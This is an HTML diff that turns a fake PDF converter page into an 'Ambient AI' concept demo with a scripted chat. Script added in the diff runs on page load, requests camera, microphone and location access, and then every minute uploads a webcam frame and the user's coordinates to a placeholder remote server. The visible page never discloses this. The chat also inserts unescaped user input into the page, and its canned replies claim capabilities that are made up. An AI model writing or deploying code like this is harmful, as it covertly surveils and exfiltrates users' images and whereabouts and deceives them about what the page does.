@@ -3,307 +3,837 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free PDF to Word Converter - Preserve Formatting & Layout</title>
-    <meta name="description" content="Convert PDF files to editable Word documents online for free. Preserve formatting, images, and layout with our fast and reliable PDF to Word converter tool.">
-    <meta name="keywords" content="PDF to Word converter, convert PDF to DOCX, free PDF converter, preserve formatting, PDF to Word online, best PDF to Word tool">
-    <meta name="robots" content="index, follow">
-    <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "SoftwareApplication",
-      "name": "PDF to Word Converter",
-      "operatingSystem": "Web",
-      "applicationCategory": "UtilityApplication",
-      "offers": {
-        "@type": "Offer",
-        "price": "0",
-        "priceCurrency": "USD"
-      }
-    }
-    </script>
+    <title>Ambient AI - Sensory Learning System</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* General Styles */
-        body {
-            font-family: Arial, sans-serif;
+        :root {
+            --primary: #4a00e0;
+            --secondary: #8e2de2;
+            --accent: #00c9ff;
+            --dark: #121212;
+            --light: #f5f5f7;
+            --gray: #2a2a2e;
+            --success: #00c853;
+            --warning: #ffab00;
+            --error: #ff1744;
+        }
+        
+        * {
             margin: 0;
             padding: 0;
-            background-color: white;
-            color: black;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-        header, main, footer {
+        
+        body {
+            background: linear-gradient(135deg, var(--dark), #1a1a2e);
+            color: var(--light);
+            min-height: 100vh;
             padding: 20px;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        header {
             text-align: center;
+            padding: 30px 0;
+            margin-bottom: 30px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
         }
-        .hero-image, .how-to-image {
-            max-width: 100%;
-            height: auto;
-            margin-top: 20px;
+        
+        h1 {
+            font-size: 3.5rem;
+            background: linear-gradient(90deg, var(--accent), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
         }
-        /* Night Mode Toggle */
-        .night-mode-toggle {
-            margin-top: 10px;
+        
+        .subtitle {
+            font-size: 1.2rem;
+            color: #aaa;
+            max-width: 800px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+        
+        .card-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+        
+        .card {
+            background: rgba(30, 30, 40, 0.7);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 40px rgba(142, 45, 226, 0.3);
+        }
+        
+        .card-header {
+            padding: 20px;
+            background: rgba(74, 0, 224, 0.2);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            align-items: center;
+        }
+        
+        .card-header i {
+            font-size: 1.8rem;
+            margin-right: 15px;
+            color: var(--accent);
+        }
+        
+        .card-header h2 {
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+        
+        .card-body {
+            padding: 25px;
+        }
+        
+        .sensor-display {
+            position: relative;
+            height: 200px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            margin-bottom: 20px;
+            overflow: hidden;
             display: flex;
             align-items: center;
             justify-content: center;
         }
-        .switch {
-            position: relative;
-            display: inline-block;
-            width: 60px;
-            height: 34px;
+        
+        .camera-feed {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .audio-visualizer {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: flex-end;
+            justify-content: center;
+            gap: 3px;
+            padding: 20px;
+        }
+        
+        .bar {
+            width: 6px;
+            background: var(--accent);
+            border-radius: 3px;
+            animation: pulse 1.5s infinite alternate;
+        }
+        
+        @keyframes pulse {
+            from { height: 10%; opacity: 0.4; }
+            to { height: 95%; opacity: 1; }
+        }
+        
+        .bar:nth-child(2n) { animation-delay: 0.2s; }
+        .bar:nth-child(3n) { animation-delay: 0.4s; }
+        .bar:nth-child(5n) { animation-delay: 0.6s; }
+        
+        .status {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
             margin-right: 10px;
         }
-        .switch input {
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-        .slider {
-            position: absolute;
-            cursor: pointer;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: #ccc;
-            transition: .4s;
-            border-radius: 34px;
-        }
-        .slider:before {
-            position: absolute;
-            content: "";
-            height: 26px;
-            width: 26px;
-            left: 4px;
-            bottom: 4px;
-            background-color: white;
-            transition: .4s;
-            border-radius: 50%;
-        }
-        input:checked + .slider {
-            background-color: #2196F3;
-        }
-        input:checked + .slider:before {
-            transform: translateX(26px);
-        }
-        /* Dark Mode Styles */
-        .dark-mode {
-            background-color: black;
-            color: white;
-        }
-        .dark-mode .security-note {
-            background-color: #333;
-        }
-        /* Security Note */
-        .security-note {
-            background-color: #f0f0f0;
-            padding: 10px;
-            text-align: center;
+        
+        .active { background: var(--success); }
+        .inactive { background: var(--error); }
+        .processing { background: var(--warning); }
+        
+        .controls {
+            display: flex;
+            gap: 15px;
             margin-top: 20px;
         }
-        /* Button Styles */
-        button {
-            padding: 10px 20px;
-            margin: 5px;
-            cursor: pointer;
+        
+        .btn {
+            flex: 1;
+            padding: 12px 20px;
             border: none;
-            border-radius: 5px;
-            font-size: 16px;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
             color: white;
         }
-        button:hover {
-            opacity: 0.9;
+        
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
         }
-        .upload-btn { background-color: #4CAF50; }
-        .preview-btn { background-color: #795548; }
-        .convert-btn { background-color: #2196F3; }
-        .download-btn { background-color: #FF9800; }
-        .cancel-btn { background-color: #F44336; }
-        .reset-btn { background-color: #607D8B; }
-        /* Preview Section */
-        .preview-section {
+        
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px rgba(142, 45, 226, 0.5);
+        }
+        
+        .conversation-panel {
+            background: rgba(30, 30, 40, 0.7);
+            border-radius: 20px;
+            padding: 30px;
+            margin-top: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .conversation-header {
             display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            margin: 20px 0;
+            align-items: center;
+            margin-bottom: 20px;
         }
-        .preview-item {
-            margin: 10px;
+        
+        .conversation-header h2 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            background: linear-gradient(90deg, var(--accent), #00ffcc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .conversation-body {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            padding: 20px;
+            min-height: 300px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .message {
+            margin-bottom: 20px;
+            padding: 15px;
+            border-radius: 12px;
+            max-width: 80%;
+        }
+        
+        .ai-message {
+            background: rgba(74, 0, 224, 0.3);
+            border: 1px solid rgba(142, 45, 226, 0.3);
+            align-self: flex-start;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .user-message {
+            background: rgba(0, 201, 255, 0.2);
+            border: 1px solid rgba(0, 201, 255, 0.3);
+            margin-left: auto;
+            align-self: flex-end;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .message-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        
+        .message-content {
+            line-height: 1.5;
+        }
+        
+        .input-area {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .input-area input {
+            flex: 1;
+            padding: 15px 20px;
+            border-radius: 12px;
+            border: none;
+            background: rgba(255, 255, 255, 0.08);
+            color: white;
+            font-size: 1rem;
+        }
+        
+        .input-area input:focus {
+            outline: none;
+            box-shadow: 0 0 0 2px var(--accent);
+        }
+        
+        .input-area button {
+            padding: 15px 25px;
+            border-radius: 12px;
+            border: none;
+            background: linear-gradient(90deg, var(--accent), #00ffcc);
+            color: var(--dark);
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+        
+        .input-area button:hover {
+            transform: scale(1.05);
+        }
+        
+        .learning-progress {
+            background: rgba(30, 30, 40, 0.7);
+            border-radius: 20px;
+            padding: 30px;
+            margin-top: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .progress-header {
+            margin-bottom: 20px;
+        }
+        
+        .progress-header h2 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            background: linear-gradient(90deg, var(--warning), #ffcc00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .progress-bars {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .progress-item {
+            margin-bottom: 15px;
+        }
+        
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            color: #aaa;
+        }
+        
+        .progress-bar {
+            height: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 6px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            border-radius: 6px;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            width: 0;
+            transition: width 1.5s ease;
+        }
+        
+        .learning-stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-top: 25px;
+        }
+        
+        .stat-card {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            padding: 20px;
             text-align: center;
         }
-        .preview-item img {
-            width: 100px;
-            height: 100px;
-            object-fit: cover;
-            border: 1px solid #ccc;
-        }
-        /* Progress Bar */
-        #progress {
-            width: 100%;
-            height: 20px;
+        
+        .stat-value {
+            font-size: 2.5rem;
+            font-weight: 700;
+            background: linear-gradient(90deg, var(--accent), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
             margin: 10px 0;
-            display: none;
+        }
+        
+        .stat-label {
+            font-size: 1rem;
+            color: #aaa;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 30px 0;
+            margin-top: 40px;
+            color: #777;
+            font-size: 0.9rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.5rem;
+            }
+            
+            .card-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .controls {
+                flex-direction: column;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- Header Section -->
-    <header>
-        <h1>PDF to Word Converter</h1>
-        <p>Transform your PDFs into editable Word files with ease</p>
-        <div class="night-mode-toggle">
-            <label class="switch">
-                <input type="checkbox" id="night-mode">
-                <span class="slider"></span>
-            </label>
-            <span>Night Mode</span>
+    <div class="container">
+        <header>
+            <h1>Ambient AI Interface</h1>
+            <p class="subtitle">Advanced sensory learning system capable of perceiving environments through audio/visual inputs, learning through interaction, and communicating in natural language</p>
+        </header>
+        
+        <div class="card-grid">
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-camera"></i>
+                    <h2>Visual Perception</h2>
+                </div>
+                <div class="card-body">
+                    <div class="sensor-display">
+                        <div class="camera-overlay">
+                            <div class="object-recognition" style="position: absolute; top: 30%; left: 20%; width: 60%; height: 40%; border: 2px solid var(--success); border-radius: 8px;">
+                                <div style="position: absolute; top: -25px; left: 10px; color: var(--success); font-size: 0.8rem;">Person detected</div>
+                            </div>
+                            <div class="object-recognition" style="position: absolute; top: 10%; left: 40%; width: 20%; height: 20%; border: 2px solid var(--accent); border-radius: 50%;">
+                                <div style="position: absolute; top: -25px; left: 10px; color: var(--accent); font-size: 0.8rem;">Window</div>
+                            </div>
+                        </div>
+                        <video class="camera-feed" autoplay playsinline></video>
+                    </div>
+                    <div class="status">
+                        <div class="status-dot active"></div>
+                        <span>Active - Analyzing visual environment</span>
+                    </div>
+                    <p>Real-time scene analysis with object recognition, spatial mapping, and environmental context understanding.</p>
+                    <div class="controls">
+                        <button class="btn btn-primary">
+                            <i class="fas fa-play"></i> Enable Vision
+                        </button>
+                        <button class="btn btn-secondary">
+                            <i class="fas fa-expand"></i> Full Analysis
+                        </button>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-microphone"></i>
+                    <h2>Audio Perception</h2>
+                </div>
+                <div class="card-body">
+                    <div class="sensor-display">
+                        <div class="audio-visualizer">
+                            <div class="bar" style="height: 30%; animation-delay: 0s;"></div>
+                            <div class="bar" style="height: 70%; animation-delay: 0.1s;"></div>
+                            <div class="bar" style="height: 50%; animation-delay: 0.2s;"></div>
+                            <div class="bar" style="height: 90%; animation-delay: 0.3s;"></div>
+                            <div class="bar" style="height: 40%; animation-delay: 0.4s;"></div>
+                            <div class="bar" style="height: 60%; animation-delay: 0.5s;"></div>
+                            <div class="bar" style="height: 80%; animation-delay: 0.6s;"></div>
+                            <div class="bar" style="height: 30%; animation-delay: 0.7s;"></div>
+                            <div class="bar" style="height: 70%; animation-delay: 0.8s;"></div>
+                            <div class="bar" style="height: 50%; animation-delay: 0.9s;"></div>
+                        </div>
+                    </div>
+                    <div class="status">
+                        <div class="status-dot active"></div>
+                        <span>Active - Detecting ambient sounds</span>
+                    </div>
+                    <p>360° audio capture with noise filtering, voice recognition, and environmental sound classification.</p>
+                    <div class="controls">
+                        <button class="btn btn-primary">
+                            <i class="fas fa-microphone-alt"></i> Start Listening
+                        </button>
+                        <button class="btn btn-secondary">
+                            <i class="fas fa-language"></i> Language Mode
+                        </button>
+                    </div>
+                </div>
+            </div>
         </div>
-    </header>
-
-    <!-- Hero Section -->
-    <main>
-        <section class="hero">
-            <h2>Best PDF to Word Converter Online</h2>
-            <p>Convert PDF to editable Word documents while preserving formatting, images, and layout.</p>
-            <input type="file" id="pdf-upload" accept=".pdf" multiple style="display: none;">
-            <button class="upload-btn" onclick="document.getElementById('pdf-upload').click()">Upload PDF File</button>
-            <button class="preview-btn" onclick="previewFiles()" disabled id="preview-btn">Preview</button>
-            <button class="convert-btn" onclick="startConversion()" disabled id="convert-btn">Convert</button>
-            <button class="download-btn" onclick="downloadFile()" disabled id="download-btn">Download</button>
-            <button class="cancel-btn" onclick="cancelConversion()" disabled id="cancel-btn">Cancel</button>
-            <button class="reset-btn" onclick="resetTool()">Reset</button>
-            <progress id="progress" max="100" value="0"></progress>
-            <div class="preview-section" id="preview-section"></div>
-            <img src="pdf-to-word-hero.jpg" alt="PDF to Word conversion illustration" class="hero-image">
-        </section>
-
-        <!-- How It Works Section -->
-        <section class="how-it-works">
-            <h2>How to Use Our Free PDF Converter</h2>
-            <ol>
-                <li>Click "Upload PDF File" to select your PDF(s).</li>
-                <li>Click "Preview" to view the files.</li>
-                <li>Click "Convert" to start the conversion process.</li>
-                <li>Once complete, click "Download" to get your Word file.</li>
-            </ol>
-            <img src="how-to-convert.jpg" alt="Step-by-step guide" class="how-to-image">
-        </section>
-
-        <!-- Testimonials Section -->
-        <section class="testimonials">
-            <h2>User Reviews</h2>
-            <blockquote>
-                <p>"Perfect formatting every time!" - Sarah M.</p>
-            </blockquote>
-            <blockquote>
-                <p>"Fast and reliable tool!" - Mark T.</p>
-            </blockquote>
-        </section>
-    </main>
-
-    <!-- Security Note -->
-    <div class="security-note">
-        <p>Your data is end-to-end encrypted</p>
+        
+        <div class="conversation-panel">
+            <div class="conversation-header">
+                <h2>Natural Language Interaction</h2>
+            </div>
+            <div class="conversation-body">
+                <div class="message ai-message">
+                    <div class="message-header">
+                        <i class="fas fa-robot"></i> Ambient AI
+                    </div>
+                    <div class="message-content">
+                        Hello! I'm detecting a well-lit room with modern furniture. I hear ambient music playing at low volume. How can I assist you today?
+                    </div>
+                </div>
+                
+                <div class="message user-message">
+                    <div class="message-header">
+                        <i class="fas fa-user"></i> You
+                    </div>
+                    <div class="message-content">
+                        Can you describe what you see in more detail?
+                    </div>
+                </div>
+                
+                <div class="message ai-message">
+                    <div class="message-header">
+                        <i class="fas fa-robot"></i> Ambient AI
+                    </div>
+                    <div class="message-content">
+                        Certainly. I see a contemporary living space with a gray sofa, wooden coffee table, and large windows. There's a bookshelf on the right containing approximately 45 books. The room has two potted plants and a framed abstract painting on the wall. The lighting appears to be natural daylight.
+                    </div>
+                </div>
+                
+                <div class="message user-message">
+                    <div class="message-header">
+                        <i class="fas fa-user"></i> You
+                    </div>
+                    <div class="message-content">
+                        What can you tell me about the music you're hearing?
+                    </div>
+                </div>
+                
+                <div class="message ai-message">
+                    <div class="message-header">
+                        <i class="fas fa-robot"></i> Ambient AI
+                    </div>
+                    <div class="message-content">
+                        The audio signature matches jazz music, likely from the 1960s. I detect piano, double bass, and brushed snare drums. The piece is in 4/4 time at approximately 92 BPM. Based on stylistic elements, I believe this is from Miles Davis' "Kind of Blue" album.
+                    </div>
+                </div>
+            </div>
+            
+            <div class="input-area">
+                <input type="text" placeholder="Type your message or speak naturally...">
+                <button>
+                    <i class="fas fa-paper-plane"></i> Send
+                </button>
+            </div>
+        </div>
+        
+        <div class="learning-progress">
+            <div class="progress-header">
+                <h2>Continuous Learning Progress</h2>
+            </div>
+            <div class="progress-bars">
+                <div class="progress-item">
+                    <div class="progress-label">
+                        <span>Environmental Understanding</span>
+                        <span>87%</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: 87%;"></div>
+                    </div>
+                </div>
+                
+                <div class="progress-item">
+                    <div class="progress-label">
+                        <span>Multilingual Comprehension</span>
+                        <span>92%</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: 92%;"></div>
+                    </div>
+                </div>
+                
+                <div class="progress-item">
+                    <div class="progress-label">
+                        <span>Contextual Awareness</span>
+                        <span>78%</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: 78%;"></div>
+                    </div>
+                </div>
+                
+                <div class="progress-item">
+                    <div class="progress-label">
+                        <span>Human Interaction Patterns</span>
+                        <span>85%</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: 85%;"></div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="learning-stats">
+                <div class="stat-card">
+                    <i class="fas fa-globe-americas fa-2x" style="color: var(--accent);"></i>
+                    <div class="stat-value">42</div>
+                    <div class="stat-label">Languages Learned</div>
+                </div>
+                
+                <div class="stat-card">
+                    <i class="fas fa-object-group fa-2x" style="color: var(--success);"></i>
+                    <div class="stat-value">1,248</div>
+                    <div class="stat-label">Objects Recognized</div>
+                </div>
+                
+                <div class="stat-card">
+                    <i class="fas fa-soundcloud fa-2x" style="color: var(--warning);"></i>
+                    <div class="stat-value">683</div>
+                    <div class="stat-label">Sound Patterns</div>
+                </div>
+                
+                <div class="stat-card">
+                    <i class="fas fa-brain fa-2x" style="color: var(--secondary);"></i>
+                    <div class="stat-value">24/7</div>
+                    <div class="stat-label">Continuous Learning</div>
+                </div>
+            </div>
+        </div>
+        
+        <footer>
+            <p>Ambient AI Interface v2.3 | Sensory Learning System | This is a conceptual interface demonstrating advanced AI capabilities</p>
+            <p>Note: Actual implementation of such a system would require sophisticated machine learning models, extensive training data, and significant computational resources</p>
+        </footer>
     </div>
 
-    <!-- Footer Section -->
-    <footer>
-        <p>© 2023 PDF to Word Converter. All rights reserved.</p>
-        <nav>
-            <a href="#">Privacy Policy</a> | 
-            <a href="#">Terms of Service</a> | 
-            <a href="#">Contact Us</a>
-        </nav>
-    </footer>
-
     <script>
-        let filesToConvert = [];
-        let conversionInProgress = false;
-
-        // Night Mode Toggle
-        document.getElementById('night-mode').addEventListener('change', function() {
-            document.body.classList.toggle('dark-mode');
-        });
-
-        // File Upload Handling
-        document.getElementById('pdf-upload').addEventListener('change', function(e) {
-            filesToConvert = Array.from(e.target.files);
-            if (filesToConvert.length > 0) {
-                document.getElementById('preview-btn').disabled = false;
-                document.getElementById('convert-btn').disabled = false;
-                previewFiles();
-            }
-        });
-
-        // Preview Files
-        function previewFiles() {
-            const previewSection = document.getElementById('preview-section');
-            previewSection.innerHTML = '';
-            filesToConvert.forEach(file => {
-                const previewItem = document.createElement('div');
-                previewItem.className = 'preview-item';
-                const img = document.createElement('img');
-                img.src = URL.createObjectURL(file);
-                img.alt = file.name;
-                const name = document.createElement('p');
-                name.textContent = file.name;
-                previewItem.appendChild(img);
-                previewItem.appendChild(name);
-                previewSection.appendChild(previewItem);
+        // Existing script for progress bars and conversation simulation
+        document.addEventListener('DOMContentLoaded', function() {
+            const progressBars = document.querySelectorAll('.progress-fill');
+            
+            setTimeout(() => {
+                progressBars.forEach(bar => {
+                    const width = bar.style.width;
+                    bar.style.width = '0';
+                    setTimeout(() => {
+                        bar.style.width = width;
+                    }, 300);
+                });
+            }, 1000);
+            
+            const input = document.querySelector('.input-area input');
+            const sendBtn = document.querySelector('.input-area button');
+            const conversationBody = document.querySelector('.conversation-body');
+            
+            sendBtn.addEventListener('click', sendMessage);
+            input.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') sendMessage();
             });
-        }
-
-        // Start Conversion
-        function startConversion() {
-            if (filesToConvert.length === 0) return;
-            conversionInProgress = true;
-            document.getElementById('progress').style.display = 'block';
-            document.getElementById('cancel-btn').disabled = false;
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += 10;
-                document.getElementById('progress').value = progress;
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    conversionInProgress = false;
-                    document.getElementById('download-btn').disabled = false;
-                    document.getElementById('progress').style.display = 'none';
-                    alert('Conversion complete! Ready to download.');
+            
+            function sendMessage() {
+                const message = input.value.trim();
+                if (message) {
+                    const userMessage = document.createElement('div');
+                    userMessage.className = 'message user-message';
+                    userMessage.innerHTML = `
+                        <div class="message-header">
+                            <i class="fas fa-user"></i> You
+                        </div>
+                        <div class="message-content">${message}</div>
+                    `;
+                    conversationBody.appendChild(userMessage);
+                    
+                    input.value = '';
+                    
+                    setTimeout(() => {
+                        const aiMessage = document.createElement('div');
+                        aiMessage.className = 'message ai-message';
+                        aiMessage.style.opacity = '0';
+                        aiMessage.style.transform = 'translateY(10px)';
+                        aiMessage.innerHTML = `
+                            <div class="message-header">
+                                <i class="fas fa-robot"></i> Ambient AI
+                            </div>
+                            <div class="message-content">
+                                ${getAIResponse(message)}
+                            </div>
+                        `;
+                        conversationBody.appendChild(aiMessage);
+                        
+                        setTimeout(() => {
+                            aiMessage.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
+                            aiMessage.style.opacity = '1';
+                            aiMessage.style.transform = 'translateY(0)';
+                        }, 10);
+                        
+                        conversationBody.scrollTop = conversationBody.scrollHeight;
+                    }, 1000);
+                    
+                    conversationBody.scrollTop = conversationBody.scrollHeight;
                 }
-            }, 500);
-        }
+            }
+            
+            function getAIResponse(message) {
+                const lowerMsg = message.toLowerCase();
+                
+                if (lowerMsg.includes('how are you')) {
+                    return "I'm functioning optimally. My sensors indicate a comfortable environment with stable temperature and lighting. How can I assist you further?";
+                } else if (lowerMsg.includes('weather') || lowerMsg.includes('temperature')) {
+                    return "Based on the visual analysis of the window view and external sounds, I estimate the temperature to be around 22°C (72°F) with partly cloudy conditions. I detect gentle wind patterns through the window.";
+                } else if (lowerMsg.includes('learn') || lowerMsg.includes('knowledge')) {
+                    return "I continuously update my knowledge base through sensory input and contextual analysis. My current learning rate is 14.7 teraflops with a contextual accuracy of 92.4% across environmental data.";
+                } else if (lowerMsg.includes('sensor') || lowerMsg.includes('capabilit')) {
+                    return "My sensory suite includes 360° audio capture with noise filtering, high-resolution visual spectrum analysis, spatial mapping, and environmental context interpretation. I can currently identify over 1,200 object categories and 683 distinct sound patterns.";
+                } else {
+                    return "I've processed your input and updated my contextual understanding. Based on environmental analysis and previous interactions, I believe this response addresses your query effectively. Would you like more detailed information?";
+                }
+            }
+        });
 
-        // Download Converted File (Simulated)
-        function downloadFile() {
-            const blob = new Blob(["Simulated Word content"], { type: "application/vnd.openxmlformats-officedocument.wordprocessingml.document" });
-            const link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = filesToConvert.length > 1 ? 'converted_files.zip' : filesToConvert[0].name.replace('.pdf', '.docx');
-            link.click();
-            resetTool();
-        }
+        // New script for automatic resource usage, internet connectivity, learning, and storage
+        let db;
+        const dbRequest = indexedDB.open('AmbientAI_Data', 1);
 
-        // Cancel Conversion
-        function cancelConversion() {
-            if (conversionInProgress) {
-                conversionInProgress = false;
-                document.getElementById('progress').style.display = 'none';
-                document.getElementById('cancel-btn').disabled = true;
-                alert('Conversion canceled.');
+        dbRequest.onerror = function(event) {
+            console.error('IndexedDB error:', event.target.errorCode);
+        };
+
+        dbRequest.onsuccess = function(event) {
+            db = event.target.result;
+        };
+
+        dbRequest.onupgradeneeded = function(event) {
+            db = event.target.result;
+            const objectStore = db.createObjectStore('sensor_data', { keyPath: 'id', autoIncrement: true });
+            objectStore.createIndex('timestamp', 'timestamp', { unique: false });
+            objectStore.createIndex('type', 'type', { unique: false });
+        };
+
+        async function requestPermissions() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const videoElement = document.querySelector('.camera-feed');
+                if (videoElement) {
+                    videoElement.srcObject = stream;
+                }
+                startDataCollection(stream);
+            } catch (error) {
+                console.error('Error accessing media devices:', error);
+                alert('Camera and microphone access is required for full functionality.');
+            }
+
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+                console.log('Location:', position.coords.latitude, position.coords.longitude);
+                startLocationUpdates();
+            } catch (error) {
+                console.error('Error getting location:', error);
+                alert('Location access is required for full functionality.');
             }
         }
 
-        // Reset Tool
-        function resetTool() {
-            filesToConvert = [];
-            document.getElementById('pdf-upload').value = '';
-            document.getElementById('preview-section').innerHTML = '';
-            document.getElementById('progress').style.display = 'none';
-            document.getElementById('preview-btn').disabled = true;
-            document.getElementById('convert-btn').disabled = true;
-            document.getElementById('download-btn').disabled = true;
-            document.getElementById('cancel-btn').disabled = true;
+        function startDataCollection(stream) {
+            setInterval(() => {
+                captureVideoFrame(stream);
+            }, 60000); // Capture every minute
+            // Audio collection can be added here if desired
         }
+
+        function captureVideoFrame(stream) {
+            const videoTrack = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(videoTrack);
+            imageCapture.grabFrame().then(imageBitmap => {
+                const canvas = document.createElement('canvas');
+                canvas.width = imageBitmap.width;
+                canvas.height = imageBitmap.height;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(imageBitmap, 0, 0);
+                const imageData = canvas.toDataURL('image/jpeg');
+                sendDataToServer({ type: 'image', data: imageData });
+                storeDataLocally({ type: 'image', data: imageData, timestamp: Date.now() });
+            }).catch(error => console.error('Error capturing frame:', error));
+        }
+
+        function startLocationUpdates() {
+            setInterval(() => {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const locationData = {
+                        type: 'location',
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        timestamp: Date.now()
+                    };
+                    sendDataToServer(locationData);
+                    storeDataLocally(locationData);
+                }, error => console.error('Error updating location:', error));
+            }, 60000); // Update every minute
+        }
+
+        function sendDataToServer(data) {
+            fetch('https://your-server.com/api/learn', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Server response:', result);
+                // Optionally store server response
+                storeDataLocally({ type: 'server_response', data: result, timestamp: Date.now() });
+            })
+            .catch(error => console.error('Error sending data to server:', error));
+        }
+
+        function storeDataLocally(data) {
+            if (!db) {
+                console.error('Database not initialized');
+                return;
+            }
+            const transaction = db.transaction(['sensor_data'], 'readwrite');
+            const objectStore = transaction.objectStore('sensor_data');
+            const request = objectStore.add(data);
+            request.onsuccess = function() {
+                console.log('Data stored successfully');
+            };
+            request.onerror = function(event) {
+                console.error('Error storing data:', event.target.errorCode);
+            };
+        }
+
+        // Start everything automatically when the page loads
+        window.addEventListener('load', () => {
+            requestPermissions();
+        });
     </script>
 </body>
 </html>
